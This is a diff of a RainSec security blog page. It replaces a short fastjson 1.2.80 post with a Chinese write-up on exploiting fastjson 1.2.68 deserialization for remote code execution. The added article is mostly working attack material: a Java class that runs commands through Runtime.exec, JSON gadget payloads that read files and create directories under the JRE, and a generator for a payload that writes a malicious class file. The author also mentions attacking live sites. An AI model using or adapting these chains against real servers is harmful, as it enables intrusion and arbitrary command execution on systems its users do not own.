@@ -10,7 +10,7 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="RainSec,"> 
-    <meta name="description" content="致力于云原生安全和自动化渗透测试的研究与分享,fastjson 1.2.80 调试小记先膜一下浅蓝师傅，在1.2.80的绕过中主要是通过setter方法参数 、public field 、构造方法的参数 类加白 ，再用加白的类来构造gadget,"> 
+    <meta name="description" content="致力于云原生安全和自动化渗透测试的研究与分享,fastjson 1.2.68 反序列化rce探索前言  fastjson 1.2.68 目前公开的利用链中比较好用的是voidfyoo师傅的Commons IO 写文件链子，但是在spring环境,"> 
     <meta name="author" content="RainSec"> 
     <link rel="alternative" href="atom.xml" title="RainSec" type="application/atom+xml"> 
     <link rel="icon" href="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg"> 
@@ -118,13 +118,13 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    1.5k
+                    10k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    1 mins.
+                    9 mins.
                 </span>
                 
                 
@@ -158,17 +158,207 @@
 <div class="article">
     <div class='main'>
         <div class="content markdown animated fadeIn">
-            <h1 id="fastjson-1-2-80-调试小记"><a href="#fastjson-1-2-80-调试小记" class="headerlink" title="fastjson 1.2.80 调试小记"></a>fastjson 1.2.80 调试小记</h1><p>先膜一下浅蓝师傅，在1.2.80的绕过中主要是通过setter方法参数 、public field 、构造方法的参数 类加白 ，再用加白的类来构造gadget。<br>笔者在复现时发现，不同的加白方法适用于不同的版本范围，遂有了这篇调试小记。</p>
-<h2 id="1-2-73-1-2-80"><a href="#1-2-73-1-2-80" class="headerlink" title="1.2.73-1.2.80"></a>1.2.73-1.2.80</h2><p>setter方法参数 &amp; public field 加白</p>
-<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220930/1.46ttatd6ng20.jpg"></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/compare/1.2.72...1.2.73">https://github.com/alibaba/fastjson/compare/1.2.72...1.2.73</a><br><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220930/2.2u2huxydnh20.jpg"></p>
-<h2 id="1-2-76-1-2-80"><a href="#1-2-76-1-2-80" class="headerlink" title="1.2.76-1.2.80"></a>1.2.76-1.2.80</h2><p>构造方法的参数加白</p>
-<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220930/3.5kl2k3mnfyg0.jpg"></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/compare/1.2.75...1.2.76">https://github.com/alibaba/fastjson/compare/1.2.75...1.2.76</a><br><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220930/4.o9vu7t6mkg0.jpg"></p>
-<p>poc来自于 <a target="_blank" rel="noopener" href="https://github.com/hosch3n/FastjsonVulns">https://github.com/hosch3n/FastjsonVulns</a><br>同时感谢这位师傅为笔者指出 75到76的代码变化</p>
-<p>最后再分享一个浅蓝师傅说的绕waf 方式 ，笔者刚用这种方式绕waf成功打入核心，并且此方法适用的版本较广，低版本的fastjson也可以用</p>
-<pre><code>{'@type':xjava.lang.Class"}
+            <h1 id="fastjson-1-2-68-反序列化rce探索"><a href="#fastjson-1-2-68-反序列化rce探索" class="headerlink" title="fastjson 1.2.68 反序列化rce探索"></a>fastjson 1.2.68 反序列化rce探索</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  fastjson 1.2.68 目前公开的利用链中比较好用的是voidfyoo师傅的Commons IO 写文件链子，但是在spring环境下，仅仅通过写文件rce较为困难，本文更多的是结合多位师傅的文章理出一条通过写文件稳定rce方法</p>
+<h2 id="JDK8任意文件写场景下的Fastjson-RCE"><a href="#JDK8任意文件写场景下的Fastjson-RCE" class="headerlink" title="JDK8任意文件写场景下的Fastjson RCE"></a>JDK8任意文件写场景下的Fastjson RCE</h2><p>  通过覆盖charsets.jar缺点太多，一是文件大，二是java版本不适配。另外笔者觉得还有一个致命因素，一般来说项目中只要使用了Charset.forName 就会加载charsets.jar，这样来讲正常的业务代码中几乎都已经加载过charsets.jar，即使后来再覆盖charsets.jar也不会重新加载。仅为笔者个人（java初学者）想法（或许是在哪里看到过别的师傅的文章，有点印象），如有错误欢迎师傅指点。</p>
+<p>  threedr3am师傅给出了任意文件写的情况下，如何更稳定地rce。简单来讲如果写一个恶意的class到jre/classes/目录下，class内容如下：</p>
+<pre><code class="java">import java.io.IOException;
+
+public class MyClass implements AutoCloseable {
+    public MyClass(String cmd) throws IOException {
+        Runtime.getRuntime().exec(cmd);
+    }
+
+    public void close() throws Exception {
+    }
+
+    static {
+        try {
+            Runtime.getRuntime().exec("open -a Calculator");
+        } catch (IOException var1) {
+            throw new RuntimeException(var1);
+        }
+    }
+}
 </code></pre>
+<p>  正在运行的项目会加载这个class文件，我们只需要使用如下poc即可rce。</p>
+<pre><code>{"@type":"java.lang.AutoCloseable","@type":"MyClass","cmd":"open -a Calculator"}
+</code></pre>
+<p>  这里只做简述，具体原理到threedr3am师傅的博客中查看。</p>
+<p>  很可惜的是jre目录下默认并不会存在classes目录，另外voidfyoo师傅给出的Commons IO 写文件链子不能写二进制文件，具体原因是使用的输入输出流都是经过编码的，而二进制文件中部分字符编码/解码失败就会写入脏字符。<br>那么目前我们需要解决的问题有三点：</p>
+<ol>
+<li>获取jdk目录</li>
+<li>创建classes目录</li>
+<li>写入class文件</li>
+</ol>
+<h2 id="获取jdk目录"><a href="#获取jdk目录" class="headerlink" title="获取jdk目录"></a>获取jdk目录</h2><p>  在Blackhat的议题中分享了一条commons-io逐字节读文件的链子，但是局限性很大。经过浅蓝师傅的扩展，目前可以做到有抛出异常的布尔读和利用dnslog 无回显读 ,贴一下浅蓝师傅的有抛出异常的布尔读取文件的poc：</p>
+<pre><code>{
+  "abc":{"@type": "java.lang.AutoCloseable",
+    "@type": "org.apache.commons.io.input.BOMInputStream",
+    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
+      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
+        "url": "file:///tmp/test"
+      },
+      "charsetName": "UTF-8",
+      "bufferSize": 1024
+    },"boms": [
+      {
+        "@type": "org.apache.commons.io.ByteOrderMark",
+        "charsetName": "UTF-8",
+        "bytes": [
+          98
+        ]
+      }
+    ]
+  },
+  "address" : {"@type": "java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceReader","charSequence": {"@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},"start": 0,"end": 0}
+}
+</code></pre>
+<p>  当字节码对比一致时就会走到下面charSequence处，因为类型不一致fastjson报错，业务抛出异常，<br>字节码对比不一致时返回为null，fastjson也就不会报错，业务回显正常。<br>我们可以直接读取启动命令 /proc/self/cmdline， 有的时候直接是用绝对路径来启动的，如果不是可以用netdoc协议列目录找到jdk路径</p>
+<h2 id="创建classes目录"><a href="#创建classes目录" class="headerlink" title="创建classes目录"></a>创建classes目录</h2><p>  笔者找到一条简单的通过Commons IO创建目录的链子，使用的类是<code>org.apache.commons.io.output.LockableFileWriter</code></p>
+<pre><code class="java">public LockableFileWriter(File file, Charset encoding, boolean append, String lockDir) throws IOException {
+        file = file.getAbsoluteFile();
+        if (file.getParentFile() != null) {
+            FileUtils.forceMkdir(file.getParentFile());
+        }
+
+        if (file.isDirectory()) {
+            throw new IOException("File specified is a directory");
+        } else {
+            if (lockDir == null) {
+                lockDir = System.getProperty("java.io.tmpdir");
+            }
+
+            File lockDirFile = new File(lockDir);
+            FileUtils.forceMkdir(lockDirFile);
+            this.testLockDir(lockDirFile);
+            this.lockFile = new File(lockDirFile, file.getName() + ".lck");
+            this.createLock();
+            this.out = this.initWriter(file, encoding, append);
+        }
+    }
+
+
+FileUtils#forceMkdir
+
+
+public static void forceMkdir(File directory) throws IOException {
+        ......
+        if (directory.exists()) {
+            ......
+        } else if (!directory.mkdirs() &amp;&amp; !directory.isDirectory()) {
+          ......
+        }
+
+    }
+</code></pre>
+<p>poc</p>
+<pre><code>{
+ "@type":"java.lang.AutoCloseable",
+ "@type":"org.apache.commons.io.output.WriterOutputStream",
+ "writer":{
+ "@type":"org.apache.commons.io.output.LockableFileWriter",
+ "file":"/etc/passwd", //一个存在的文件
+ "encoding":"UTF-8",
+ "append": true,
+"lockDir":"/usr/lib/jvm/java-8-openjdk-amd64/jre/classes" //要创建的目录
+ },
+ "charset":"UTF-8",
+ "bufferSize": 8193,
+ "writeImmediately": true
+ }
+</code></pre>
+<p>  file需要是一个存在的文件，才能走到下面的FileUtils.forceMkdir(lockDirFile) 创建目录<br>注：mac环境下可能有保护机制，jre下classes创建不了，实测ubuntu上是可以创建的。</p>
+<h2 id="写入class文件"><a href="#写入class文件" class="headerlink" title="写入class文件"></a>写入class文件</h2><p>  笔者能力有限，只依赖commons-io 未能找到一条写二进制文件的链子，在Blackhat的议题中分享了一条基于commons-io、commons-codec、aspectj写二进制文件的链，笔者近日打的fastjson刚好有commons-io、commons-codec，但是没有aspectj。于是在另一位师傅列出lib之后，在ant中找到了<code>org.apache.tools.ant.util.LazyFileOutputStream</code> 类，可以替代aspectj中的<code>org.eclipse.core.internal.localstore.SafeFileOutputStream</code></p>
+<pre><code class="java">public static void write_so(String target_path) throws IOException {
+    byte[] bom_buffer_bytes = readFileInBytesToString("./target/classes/MyClass.class");
+    String base64_so_content = Base64.getEncoder().encodeToString(bom_buffer_bytes);
+    byte[] big_bom_buffer_bytes = Base64.getDecoder().decode(base64_so_content);
+    String payload = String.format("{\n" +
+                "  \"@type\":\"java.lang.AutoCloseable\",\n" +
+                "  \"@type\":\"org.apache.commons.io.input.BOMInputStream\",\n" +
+                "  \"delegate\":{\n" +
+                "    \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
+                "    \"input\":{\n" +
+                "      \"@type\": \"org.apache.commons.codec.binary.Base64InputStream\",\n" +
+                "      \"in\":{\n" +
+                "        \"@type\":\"org.apache.commons.io.input.CharSequenceInputStream\",\n" +
+                "        \"charset\":\"utf-8\",\n" +
+                "        \"bufferSize\": 1024,\n" +
+                "        \"cs\":{\"@type\":\"java.lang.String\"\"%1$s\"\n" +
+                "      },\n" +
+                "      \"doEncode\":false,\n" +
+                "      \"lineLength\":1024,\n" +
+                "      \"lineSeparator\":\"5ZWKCg==\",\n" +
+                "      \"decodingPolicy\":0\n" +
+                "    },\n" +
+                "    \"branch\":{\n" +
+                //"      \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +
+                //"      \"targetPath\":\"%2$s\"\n" +
+                "      \"@type\":\"org.apache.tools.ant.util.LazyFileOutputStream\",\n" +
+                "      \"file\":\"%2$s\",\n" +
+                "      \"append\":false,\n" +
+                "      \"alwaysCreate\":true\n" +
+                "    },\n" +
+                "    \"closeBranch\":false\n" +
+                "  },\n" +
+                "  \"include\":true,\n" +
+                "  \"boms\":[{\n" +
+                "                  \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
+                "                  \"charsetName\": \"UTF-8\",\n" +
+                "                  \"bytes\":" +"%3$s\n" +
+                "                }],\n" +
+                "  \"x\":{\"$ref\":\"$.bOM\"}\n" +
+                "}",base64_so_content, "/tmp/MyClass.class", Arrays.toString(big_bom_buffer_bytes));
+    System.out.println(payload);
+}
+public static byte[] readFileInBytesToString(String filePath) {
+        final int readArraySizePerRead = 4096;
+        File file = new File(filePath);
+        ArrayList&lt;Byte&gt; bytes = new ArrayList&lt;&gt;();
+        try {
+            if (file.exists()) {
+                DataInputStream isr = new DataInputStream(new FileInputStream(
+                        file));
+                byte[] tempchars = new byte[readArraySizePerRead];
+                int charsReadCount = 0;
+
+                while ((charsReadCount = isr.read(tempchars)) != -1) {
+                    for(int i = 0 ; i &lt; charsReadCount ; i++){
+                        bytes.add (tempchars[i]);
+                    }
+                }
+                isr.close();
+            }
+        } catch (IOException e) {
+            // TODO Auto-generated catch block
+            e.printStackTrace();
+        }
+
+        return toPrimitives(bytes.toArray(new Byte[0]));
+    }
+
+    static byte[] toPrimitives(Byte[] oBytes) {
+        byte[] bytes = new byte[oBytes.length];
+
+        for (int i = 0; i &lt; oBytes.length; i++) {
+            bytes[i] = oBytes[i];
+        }
+
+        return bytes;
+    }
+</code></pre>
+<p>  笔者在vps用jar起的环境和本地手动创建classes目录之后都是可以成功的。</p>
+<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20221114/1111.1y29qdvr30zk.png"></p>
+<p>  但是打的站没成功，别的师傅通过别的链打下来后，笔者上去看了下class文件没问题，也能直接运行，但是很奇怪用fastjson加载不了。</p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>  在root权限下可以直接通过commons-io链写计划任务，低权限下通过写class文件rce，获取jdk目录、创建classes目录仅依赖commons-io，但是写入class文件需要更多不太常见的依赖，总的来讲利用条件还是较为苛刻的。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
+<ol>
+<li>Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析(<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg</a>)</li>
+<li>Blackhat 2021 议题详细分析 —— FastJson 反序列化漏洞及在区块链应用中的渗透利用(<a target="_blank" rel="noopener" href="https://paper.seebug.org/1698/#3commons-io">https://paper.seebug.org/1698/#3commons-io</a>)</li>
+<li>fastjson 读文件 gadget 的利用场景扩展(<a target="_blank" rel="noopener" href="https://b1ue.cn/archives/506.html">https://b1ue.cn/archives/506.html</a>)</li>
+<li>JDK8任意文件写场景下的Fastjson RCE(<a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/">https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/</a>)</li>
+</ol>
+</blockquote>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
@@ -235,7 +425,7 @@
             <div class="box sticky animated fadeInRight faster">
                 <div id="toc" class="subbox">
                     <h4>Contents</h4>
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fastjson-1-2-80-%E8%B0%83%E8%AF%95%E5%B0%8F%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">fastjson 1.2.80 调试小记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-73-1-2-80"><span class="toc-number">1.1.</span> <span class="toc-text">1.2.73-1.2.80</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-76-1-2-80"><span class="toc-number">1.2.</span> <span class="toc-text">1.2.76-1.2.80</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%8E%A2%E7%B4%A2"><span class="toc-number">1.</span> <span class="toc-text">fastjson 1.2.68 反序列化rce探索</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson-RCE"><span class="toc-number">1.2.</span> <span class="toc-text">JDK8任意文件写场景下的Fastjson RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96jdk%E7%9B%AE%E5%BD%95"><span class="toc-number">1.3.</span> <span class="toc-text">获取jdk目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAclasses%E7%9B%AE%E5%BD%95"><span class="toc-number">1.4.</span> <span class="toc-text">创建classes目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%85%A5class%E6%96%87%E4%BB%B6"><span class="toc-number">1.5.</span> <span class="toc-text">写入class文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%90%8E"><span class="toc-number">1.6.</span> <span class="toc-text">最后</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.7.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
                 </div>
             </div>
             
